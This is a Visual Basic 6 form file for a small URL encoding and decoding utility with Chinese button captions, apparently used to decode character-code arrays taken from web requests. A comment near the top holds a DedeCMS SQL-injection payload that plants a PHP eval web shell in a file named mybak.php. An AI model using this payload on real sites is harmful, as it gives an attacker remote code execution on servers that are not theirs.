VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   6390
   ClientLeft      =   120
   ClientTop       =   450
   ClientWidth     =   12390
   LinkTopic       =   "Form1"
   ScaleHeight     =   6390
   ScaleWidth      =   12390
   StartUpPosition =   3  '窗口缺省
   Begin VB.CommandButton Command3 
      Caption         =   "Command3"
      Height          =   615
      Left            =   4680
      TabIndex        =   5
      Top             =   5640
      Width           =   2055
   End
   Begin VB.CommandButton Command2 
      Caption         =   "解码"
      Height          =   615
      Left            =   9480
      TabIndex        =   4
      Top             =   5640
      Width           =   1335
   End
   Begin VB.TextBox Text3 
      Height          =   5415
      Left            =   3600
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   3
      Text            =   "Form1.frx":0000
      Top             =   120
      Width           =   3495
   End
   Begin VB.TextBox Text2 
      Height          =   5415
      Left            =   7200
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   2
      Top             =   120
      Width           =   5175
   End
   Begin VB.TextBox Text1 
      Height          =   5415
      Left            =   120
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   1
      Text            =   "Form1.frx":05CA
      Top             =   120
      Width           =   3375
   End
   Begin VB.CommandButton Command1 
      Caption         =   "编码"
      Height          =   615
      Left            =   7920
      TabIndex        =   0
      Top             =   5640
      Width           =   1455
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit


'cfg_dbprefixmytag` (aid,expbody,normbody) VALUES(1117,@`\'`,'{dede:php}file_put_contents(''mybak.php'',''<?php eval($_POST[mybak]);?>'');{/dede:php}') # @`\'`

Private Sub Command1_Click()
    Dim sUrl As String
    Dim sUrlEsc As String
    '以Text1文本框中的内容作为参数，
    '并将结果显示在Text2文本框中
    sUrl = Text1.Text
    sUrlEsc = EncodeUrl(sUrl)
    Text2.Text = sUrlEsc
End Sub

Private Sub Command2_Click()
    Dim sUrl As String
    Dim sUrlUnEsc As String
    '以Text2文本框编码字符串作为参数，
    '并将结果显示在Text3文本框中
    sUrl = Text2.Text
    sUrlUnEsc = DecodeUrl(sUrl)
    Text3.Text = sUrlUnEsc
End Sub

Private Sub Command3_Click()
    Text2 = VBA.Replace(Text3.Text, "&arrs1[]=", ",")
    Text2 = VBA.Replace(Text2.Text, "&arrs2[]=", ",")
    
    Dim i As Long
    Dim s() As String, STR As String
    
    
    s = VBA.Split(Text2.Text, ",", , vbTextCompare)
    
    
    For i = LBound(s) To UBound(s)
    
    STR = STR & Chr(s(i))
    
    Next
    
    
    
    Debug.Print STR
    
End Sub

Private Sub Form_Click()
    Text1.Text = "" ' "http://www.mvps.org/vbnet code lib/net code/ip address.htm"
    Text2.Text = ""
    Text3.Text = ""

End Sub

Private Function EncodeUrl(ByVal sUrl As String) As String
    Dim sUrlEsc As String
    Dim dwSize As Long
    Dim dwFlags As Long
    If Len(sUrl) > 0 Then
        sUrlEsc = Space$(MAX_PATH)
        dwSize = Len(sUrlEsc)
        dwFlags = URL_DONT_SIMPLIFY
        If UrlEscape(sUrl, _
           sUrlEsc, _
           dwSize, _
           dwFlags) = ERROR_SUCCESS Then
            EncodeUrl = Left$(sUrlEsc, dwSize)
        End If  'If UrlEscape
    End If 'If Len(sUrl) > 0
End Function

Private Function DecodeUrl(ByVal sUrl As String) As String
    Dim sUrlUnEsc As String
    Dim dwSize As Long
    Dim dwFlags As Long
    If Len(sUrl) > 0 Then
        sUrlUnEsc = Space$(MAX_PATH)
        dwSize = Len(sUrlUnEsc)
        dwFlags = URL_DONT_SIMPLIFY
        If UrlUnescape(sUrl, _
           sUrlUnEsc, _
           dwSize, _
           dwFlags) = ERROR_SUCCESS Then
            DecodeUrl = Left$(sUrlUnEsc, dwSize)
        End If  'If UrlUnescape
    End If  'If Len(sUrl) > 0
End Function

Public Function StarCode(ByVal CodeString As String) As String
    Dim objScrCtl      As Object
    If CodeString <> "" Then
        If InStr(1, CodeString, "\u") > 1 Then
            Set objScrCtl = CreateObject("MSScriptControl.ScriptControl")
            objScrCtl.Language = "JavaScript"
            StarCode = objScrCtl.Eval("unescape('" & CodeString & "')")

            Set objScrCtl = Nothing
        Else
            MsgBox "内容无法识别"
        End If
    End If

End Function

